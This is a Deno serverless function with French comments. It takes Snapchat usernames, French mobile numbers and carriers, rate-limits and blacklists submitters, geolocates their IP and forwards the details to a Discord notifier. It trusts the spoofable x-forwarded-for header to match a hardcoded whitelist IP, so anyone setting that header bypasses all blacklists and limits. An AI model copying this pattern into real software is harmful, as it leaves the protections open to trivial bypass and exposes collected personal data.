import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const VALID_OPERATORS = ['SFR', 'Bouygues', 'Orange'];
const MAX_SUBMISSIONS_PER_IP = 5;        // max 5 soumissions par IP dans la fenêtre
const WINDOW_HOURS = 24;                  // fenêtre de 24h
const BLOCK_DURATION_MINUTES = 10;        // 10 min minimum entre 2 soumissions même IP
const GLOBAL_MAX_PER_MINUTE = 5;          // max 5 soumissions toutes IPs confondues / 60s
const SNAP_COOLDOWN_MINUTES = 10;         // 10 min entre 2 soumissions pour le même pseudo Snapchat
const IP_WHITELIST = ['184.144.152.184']; // IPs qui bypass tout rate limiting / blacklist

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur } = await req.json();

    // ---- Validation stricte côté serveur ----
    if (!snapchat || !telephone || !operateur) {
      return Response.json({ error: 'Données manquantes' }, { status: 400 });
    }

    // Opérateur doit être valide
    if (!VALID_OPERATORS.includes(operateur)) {
      return Response.json({ error: 'Opérateur invalide' }, { status: 400 });
    }

    // Téléphone : uniquement 06/07 + 10 chiffres
    const tel = String(telephone).replace(/\D/g, '');
    if (!/^(06|07)\d{8}$/.test(tel)) {
      return Response.json({ error: 'Numéro de téléphone invalide' }, { status: 400 });
    }

    // Snapchat : nettoyage + limites
    const snap = String(snapchat).trim();
    if (snap.length < 1 || snap.length > 30) {
      return Response.json({ error: 'Nom Snapchat invalide' }, { status: 400 });
    }
    // Filtrer les caractères non autorisés (lettres, chiffres, _ . - uniquement)
    if (!/^[a-zA-Z0-9_.-]+$/.test(snap)) {
      return Response.json({ error: 'Nom Snapchat invalide' }, { status: 400 });
    }

    // ---- Extraction IP ----
    let ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
             req.headers.get('x-real-ip') ||
             req.headers.get('cf-connecting-ip') ||
             req.headers.get('x-client-ip') ||
             'unknown';
    ip = ip.trim();

    // ---- Extraction navigateur / appareil ----
    const userAgent = req.headers.get('user-agent') || '';
    let browser = 'Inconnu';
    let device = '💻 PC';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    if (userAgent.includes('Mobile') || userAgent.includes('Android')) device = '📱 Téléphone';
    else if (userAgent.includes('iPad')) device = '📱 Tablette';

    const now = new Date();
    const isWhitelisted = IP_WHITELIST.includes(ip);

    // ---- Vérification blacklist IP + téléphone (bypassé pour les IPs whitelistées) ----
    if (!isWhitelisted) {
      if (ip !== 'unknown') {
        const ipBlacklisted = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: ip, type: 'ip' });
        if (ipBlacklisted.length > 0) {
          return Response.json({ error: 'Accès refusé' }, { status: 403 });
        }
      }
      const phoneBlacklisted = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: tel, type: 'phone' });
      if (phoneBlacklisted.length > 0) {
        return Response.json({ error: 'Accès refusé' }, { status: 403 });
      }

      // ---- Récupère les 50 soumissions les plus récentes (1 seule requête) ----
      const recent = await base44.asServiceRole.entities.Submission.list('-created_date', 50);

      // ---- Cap global anti-spam : max N soumissions / 60s toutes IPs confondues ----
      // Bloque les attaques par rotation d'IP (1 soumission/seconde).
      const sixtySAgo = now.getTime() - 60 * 1000;
      const globalRecent = recent.filter(s => new Date(s.created_date).getTime() > sixtySAgo);
      if (globalRecent.length >= GLOBAL_MAX_PER_MINUTE) {
        return Response.json({ error: 'Trop de demandes, réessaie dans un instant' }, { status: 429 });
      }

      // ---- Cooldown par pseudo Snapchat (même si l'IP change) ----
      const snapSubmissions = recent.filter(s => s.snapchat === snap);
      if (snapSubmissions.length > 0) {
        const lastSub = new Date(snapSubmissions[0].created_date);
        const minsSinceLast = (now - lastSub) / 1000 / 60;
        if (minsSinceLast < SNAP_COOLDOWN_MINUTES) {
          const wait = Math.ceil(SNAP_COOLDOWN_MINUTES - minsSinceLast);
          return Response.json({ error: `Attends ${wait} minute(s) avant une nouvelle demande` }, { status: 429 });
        }
      }

      // ---- 10 min minimum entre 2 soumissions (par IP) ----
      const ipSubmissions = recent.filter(s => s.ip_address === ip);
      if (ipSubmissions.length > 0) {
        const lastSub = new Date(ipSubmissions[0].created_date);
        const minsSinceLast = (now - lastSub) / 1000 / 60;
        if (minsSinceLast < BLOCK_DURATION_MINUTES) {
          const wait = Math.ceil(BLOCK_DURATION_MINUTES - minsSinceLast);
          return Response.json({ error: `Attends ${wait} minute(s) avant une nouvelle demande` }, { status: 429 });
        }
      }
    }

    // ---- Géolocalisation ----
    let country = 'Inconnue';
    let city = 'Inconnue';
    try {
      const geoRes = await base44.functions.invoke('geolocateIP', { ip });
      if (geoRes?.data) {
        country = geoRes.data.country || 'Inconnue';
        city = geoRes.data.city || 'Inconnue';
      }
    } catch (geoError) {
      console.error('geolocateIP error:', geoError.message);
    }

    // ---- Création de la soumission ----
    const submission = await base44.asServiceRole.entities.Submission.create({
      snapchat: snap,
      telephone: tel,
      operateur,
      status: 'pending',
      ip_address: ip,
      country,
      browser: 'unknown'
    });

    // ---- Notification Discord ----
    await base44.functions.invoke('notifyDiscord', {
      snapchat: snap,
      telephone: tel,
      operateur,
      submissionId: submission.id,
      ip,
      country,
      city,
      browser,
      device
    }).catch(() => {});

    return Response.json({ ok: true, submissionId: submission.id });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});